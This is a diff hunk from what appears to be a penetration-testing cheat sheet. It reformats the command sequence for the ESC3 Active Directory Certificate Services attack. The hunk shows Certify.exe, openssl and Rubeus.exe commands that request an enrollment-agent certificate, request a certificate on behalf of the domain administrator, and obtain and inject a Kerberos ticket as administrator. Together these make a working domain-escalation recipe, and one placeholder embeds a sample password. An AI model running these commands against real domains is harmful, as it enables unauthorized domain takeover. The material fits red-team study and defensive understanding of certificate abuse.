@@ -325,17 +325,20 @@ C:> Certify.exe find
 C:> Certify.exe request /ca:<CA_name> /template:SmartCardEnrollment-Agent
 
 # Convert to PFX
-C:> openssl.exe pkcs12 -in <file>.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <out_file>.pfx
+C:> openssl.exe pkcs12 -in <file>.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" 
+                -export -out <out_file>.pfx
 
 # Request a certificate for DA from the second cert found using this generated one
 C:> Certify.exe request /ca:<CA_name> /template:SmartCardEnrollment-Users /onbehalfof:<domain>\administrator 
                         /enrollcert:esc3-agent.pfx /enrollcertpw:<password>
 
 # Convert to PFX
-C:> openssl.exe pkcs12 -in <in_file>.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <out_file>.pfx
+C:> openssl.exe pkcs12 -in <in_file>.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" 
+                -export -out <out_file>.pfx
 
 # Request TGT aS DOMAIN ADMIN
-c:> Rubeus.exe asktgt /user:administrator /certificate:<OOUT_fILE_PREVIOUS_STEP>.pfx /password:<pass_previous_step>SecretPass@123 /ptt
+c:> Rubeus.exe asktgt /user:administrator /certificate:<OOUT_fILE_PREVIOUS_STEP>.pfx 
+                      /password:<pass_previous_step>SecretPass@123 /ptt
 ```
 
 #### ESC6
